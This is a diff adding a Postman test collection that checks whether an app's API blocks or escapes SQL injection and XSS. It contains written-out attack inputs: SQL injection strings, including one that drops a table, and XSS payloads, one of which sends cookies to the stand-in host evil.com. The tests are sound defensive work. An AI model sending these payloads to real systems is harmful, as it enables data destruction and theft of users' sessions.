@@ -1,0 +1,304 @@
+{
+	"name": "18. Input Injection Tests",
+	"item": [
+		{
+			"name": "SQL Injection Prevention",
+			"item": [
+				{
+					"name": "18.1.1 SQL injection in login email",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('SECURITY: SQL injection should not succeed', function () {",
+									"    pm.expect(pm.response.code).to.be.oneOf([400, 401, 404]);",
+									"});",
+									"",
+									"pm.test('Should not expose database errors', function () {",
+									"    var responseText = pm.response.text().toLowerCase();",
+									"    pm.expect(responseText).to.not.include('sql');",
+									"    pm.expect(responseText).to.not.include('mysql');",
+									"    pm.expect(responseText).to.not.include('syntax error');",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"email\": \"admin@trackdev.com' OR '1'='1\",\n    \"password\": \"anything\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/login",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						}
+					}
+				},
+				{
+					"name": "18.1.2 SQL injection in task search",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('SECURITY: SQL injection in search should not succeed', function () {",
+									"    pm.expect(pm.response.code).to.be.oneOf([200, 400, 403]);",
+									"});",
+									"",
+									"pm.test('Should not expose database errors', function () {",
+									"    var responseText = pm.response.text().toLowerCase();",
+									"    pm.expect(responseText).to.not.include('sql');",
+									"    pm.expect(responseText).to.not.include('hibernate');",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "{{adminToken}}"
+							}
+						],
+						"url": {
+							"raw": "{{baseUrl}}/tasks?search='; DROP TABLE tasks;--",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"tasks"
+							],
+							"query": [
+								{
+									"key": "search",
+									"value": "'; DROP TABLE tasks;--"
+								}
+							]
+						}
+					}
+				},
+				{
+					"name": "18.1.3 SQL injection in user ID path",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('SECURITY: SQL injection in path should not succeed', function () {",
+									"    pm.expect(pm.response.code).to.be.oneOf([400, 404]);",
+									"});",
+									"",
+									"pm.test('Should not expose database errors', function () {",
+									"    var responseText = pm.response.text().toLowerCase();",
+									"    pm.expect(responseText).to.not.include('sql');",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "{{adminToken}}"
+							}
+						],
+						"url": {
+							"raw": "{{baseUrl}}/users/1 OR 1=1",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"users",
+								"1 OR 1=1"
+							]
+						}
+					}
+				}
+			]
+		},
+		{
+			"name": "XSS Prevention",
+			"item": [
+				{
+					"name": "18.2.1 XSS in task name",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Status code indicates handled request', function () {",
+									"    pm.expect(pm.response.code).to.be.oneOf([200, 400, 403]);",
+									"});",
+									"",
+									"pm.test('SECURITY: XSS script should be escaped if stored', function () {",
+									"    if (pm.response.code === 200) {",
+									"        var responseText = pm.response.text();",
+									"        // Verify raw script tags are NOT present (either escaped or not returned)",
+									"        pm.expect(responseText).to.not.include('<script>alert');",
+									"    }",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "{{professorToken}}"
+							},
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"name\": \"<script>alert('XSS')</script>\",\n    \"type\": \"USER_STORY\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/projects/{{udgProjectId}}/tasks",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"projects",
+								"{{udgProjectId}}",
+								"tasks"
+							]
+						}
+					}
+				},
+				{
+					"name": "18.2.2 XSS in comment content",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Status code indicates handled request', function () {",
+									"    pm.expect(pm.response.code).to.be.oneOf([200, 201, 400, 403, 404]);",
+									"});",
+									"",
+									"pm.test('SECURITY: XSS script should be HTML-escaped', function () {",
+									"    if (pm.response.code === 201) {",
+									"        var responseText = pm.response.text();",
+									"        // Verify script tags are HTML-escaped",
+									"        pm.expect(responseText).to.not.include('<script>document');",
+									"        pm.expect(responseText).to.include('&lt;script&gt;');",
+									"    }",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "{{professorToken}}"
+							},
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"content\": \"<script>document.location='http://evil.com?cookie='+document.cookie</script>\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/tasks/{{udgTaskId}}/comments",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"tasks",
+								"{{udgTaskId}}",
+								"comments"
+							]
+						}
+					}
+				},
+				{
+					"name": "18.2.3 XSS via image tag onerror",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Status code indicates handled request', function () {",
+									"    pm.expect(pm.response.code).to.be.oneOf([200, 400, 403]);",
+									"});",
+									"",
+									"pm.test('SECURITY: onerror handler should be HTML-escaped', function () {",
+									"    if (pm.response.code === 200) {",
+									"        var responseText = pm.response.text();",
+									"        // Verify img tag and onerror are HTML-escaped",
+									"        pm.expect(responseText).to.not.include('<img src=x onerror');",
+									"        pm.expect(responseText).to.include('&lt;img');",
+									"    }",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "PATCH",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "{{professorUdGToken}}"
+							},
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"description\": \"<img src=x onerror=alert('XSS')>\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/tasks/{{udgTaskId}}",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"tasks",
+								"{{udgTaskId}}"
+							]
+						}
+					}
+				}
+			]
+		}
+	]
+}
